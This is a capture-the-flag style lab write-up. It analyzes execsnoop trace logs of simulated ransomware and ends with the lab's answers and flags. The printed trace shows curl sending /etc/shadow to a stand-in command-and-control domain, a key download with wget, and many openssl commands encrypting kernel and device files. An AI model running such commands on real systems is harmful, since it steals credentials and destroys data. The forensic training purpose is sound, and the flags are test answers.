#### 5. Execsnoop: Trace Analysis

----

Performance monitoring and tracking tools can provide a wealth of information about a running system. In some cases, they can help identify anomalies which could have been caused by a security incident.

----

In this lab, we will analyze [`Execsnoop script's`](https://github.com/iovisor/bcc/blob/master/tools/execsnoop.py) trace logs to unearth suspicious activity. Please start the lab, answer the below questions and submit the flags to verify:

- The ransomware contacts the Command-and-Control server to register and fetch the encryption keys. What is the domain name of the Command-and-Control server?

```sh
root@attackdefense:~# less logs
Tracing exec()s. Ctrl-C to end.
Instrumenting sys_execve
   PID   PPID ARGS
 13628  13624 mawk -W interactive -v o=1 -v opt_name=0 -v name= [...]
 13629  13627 cat -v trace_pipe
 13632  88705 sudo python 1-execsnoop.py
 13633  13632 python 1-execsnoop.py
 13634  13633 nslookup some-random-domain.dev.local
 13635  13633 curl some-random-domain.dev.local?activate=true
 13636  13633 wget -O /root/.hidden/keys some-random-domain.dev.local/getKeys?ip=192.168.1.19
 13637  13633 curl -F data='@/etc/shadow' some-random-domain.dev.local
 13638  13633 whoami
 13639  13633 openssl enc -aes-256-cbc -salt -in /vmlinuz -out /vmlinuz.locked -pass: file:/root/.hidden/keys
 13640  13633 openssl enc -aes-256-cbc -salt -in /vmlinuz.old -out /vmlinuz.old.locked -pass: file:/root/.hidden/keys
 13641  13633 openssl enc -aes-256-cbc -salt -in /initrd.img.old -out /initrd.img.old.locked -pass: file:/root/.hidden/keys
 13642  13633 openssl enc -aes-256-cbc -salt -in /initrd.img -out /initrd.img.locked -pass: file:/root/.hidden/keys
 13643  13633 nslookup another-random-domain.dev.local
 13644  13633 curl -F data='@/root/.invisible/status' some-random-domain.dev.local
 13645  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa7 -out /dev/vcsa7.locked -pass: file:/root/.hidden/keys
 13646  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs7 -out /dev/vcs7.locked -pass: file:/root/.hidden/keys
 13647  13633 openssl enc -aes-256-cbc -salt -in /dev/dvd -out /dev/dvd.locked -pass: file:/root/.hidden/keys
 13648  13633 openssl enc -aes-256-cbc -salt -in /dev/cdrw -out /dev/cdrw.locked -pass: file:/root/.hidden/keys
 13649  13633 openssl enc -aes-256-cbc -salt -in /dev/cdrom -out /dev/cdrom.locked -pass: file:/root/.hidden/keys
 13650  13633 openssl enc -aes-256-cbc -salt -in /dev/vsock -out /dev/vsock.locked -pass: file:/root/.hidden/keys
 13651  13633 openssl enc -aes-256-cbc -salt -in /dev/vmci -out /dev/vmci.locked -pass: file:/root/.hidden/keys
 13652  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa6 -out /dev/vcsa6.locked -pass: file:/root/.hidden/keys
 13653  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs6 -out /dev/vcs6.locked -pass: file:/root/.hidden/keys
 13654  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa5 -out /dev/vcsa5.locked -pass: file:/root/.hidden/keys
 13655  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs5 -out /dev/vcs5.locked -pass: file:/root/.hidden/keys
 13656  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa4 -out /dev/vcsa4.locked -pass: file:/root/.hidden/keys
 13657  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs4 -out /dev/vcs4.locked -pass: file:/root/.hidden/keys
 13658  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa3 -out /dev/vcsa3.locked -pass: file:/root/.hidden/keys
 13659  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs3 -out /dev/vcs3.locked -pass: file:/root/.hidden/keys
 13660  13633 openssl enc -aes-256-cbc -salt -in /dev/vcsa2 -out /dev/vcsa2.locked -pass: file:/root/.hidden/keys
 13661  13633 openssl enc -aes-256-cbc -salt -in /dev/vcs2 -out /dev/vcs2.locked -pass: file:/root/.hidden/keys
 13662  13633 openssl enc -aes-256-cbc -salt -in /dev/vhost-vsock -out /dev/vhost-vsock.locked -pass: file:/root/.hidden/keys
 13663  13633 openssl enc -aes-256-cbc -salt -in /dev/vhost-net -out /dev/vhost-net.locked -pass: file:/root/.hidden/keys
 13664  13633 openssl enc -aes-256-cbc -salt -in /dev/uhid -out /dev/uhid.locked -pass: file:/root/.hidden/keys
 13665  13633 openssl enc -aes-256-cbc -salt -in /dev/vhci -out /dev/vhci.locked -pass: file:/root/.hidden/keys
 13666  13633 openssl enc -aes-256-cbc -salt -in /dev/userio -out /dev/userio.locked -pass: file:/root/.hidden/keys
 13667  13633 openssl enc -aes-256-cbc -salt -in /dev/btrfs-control -out /dev/btrfs-control.locked -pass: file:/root/.hidden/keys
 13668  13633 openssl enc -aes-256-cbc -salt -in /dev/cuse -out /dev/cuse.locked -pass: file:/root/.hidden/keys
 13669  13633 openssl enc -aes-256-cbc -salt -in /dev/log -out /dev/log.locked -pass: file:/root/.hidden/keys
 13670  13633 openssl enc -aes-256-cbc -salt -in /dev/initctl -out /dev/initctl.locked -pass: file:/root/.hidden/keys
 13671  13633 openssl enc -aes-256-cbc -salt -in /dev/autofs -out /dev/autofs.locked -pass: file:/root/.hidden/keys
 13672  13633 openssl enc -aes-256-cbc -salt -in /dev/sda5 -out /dev/sda5.locked -pass: file:/root/.hidden/keys
 13673  13633 openssl enc -aes-256-cbc -salt -in /dev/sda2 -out /dev/sda2.locked -pass: file:/root/.hidden/keys
 13674  13633 openssl enc -aes-256-cbc -salt -in /dev/sda1 -out /dev/sda1.locked -pass: file:/root/.hidden/keys
 13675  13633 openssl enc -aes-256-cbc -salt -in /dev/sg2 -out /dev/sg2.locked -pass: file:/root/.hidden/keys
 13676  13633 openssl enc -aes-256-cbc -salt -in /dev/sda -out /dev/sda.locked -pass: file:/root/.hidden/keys
 13677  13633 openssl enc -aes-256-cbc -salt -in /dev/fb0 -out /dev/fb0.locked -pass: file:/root/.hidden/keys
 13678  13633 openssl enc -aes-256-cbc -salt -in /dev/hidraw0 -out /dev/hidraw0.locked -pass: file:/root/.hidden/keys
 13679  13633 openssl enc -aes-256-cbc -salt -in /dev/sg1 -out /dev/sg1.locked -pass: file:/root/.hidden/keys
 13680  13633 openssl enc -aes-256-cbc -salt -in /dev/sr1 -out /dev/sr1.locked -pass: file:/root/.hidden/keys
 13681  13633 openssl enc -aes-256-cbc -salt -in /dev/sg0 -out /dev/sg0.locked -pass: file:/root/.hidden/keys
 13682  13633 openssl enc -aes-256-cbc -salt -in /dev/sr0 -out /dev/sr0.locked -pass: file:/root/.hidden/keys
 13683  13633 openssl enc -aes-256-cbc -salt -in /dev/rtc -out /dev/rtc.locked -pass: file:/root/.hidden/keys
```

```
some-random-domain.dev.local
```

- What is the password used for encrypting the files?

```sh
root@attackdefense:~# cat /root/.hidden/keys
a53d2e081e92b6cb082a2ce428929a4d
root@attackdefense:~#
```

- Which encryption scheme is used to encrypt the files?

```
aes-256-cbc
```

- The ransomware periodically tries to resolve the IP address of a kill-switch server. What is its domain name?

```
another-random-domain.dev.local
```

- The ransomware prepares a status report file and sends it to the Command-and-Control server. Provide the full path of the status file.

```
/root/.invisible/status
```

- Retrieve the flag kept in the status report file.

```sh
root@attackdefense:~# cat /root/.invisible/status
-== RansomLocker Report ==-

Encryption Status:      100% complete
Completion Time:        13:00:08 UTC
HOST:                   192.168.1.19
FLAG:                   02bf7f5ce8edca8813951916c5e26cc6
root@attackdefense:~#
```

----

###### Reference

- [`Execsnoop script`](https://github.com/iovisor/bcc/blob/master/tools/execsnoop.py)
- [`Execsnoop Examples`]
(https://github.com/iovisor/bcc/blob/master/tools/execsnoop_example.txt)
- [`BCC Tools`](https://github.com/iovisor/bcc)

----

EOF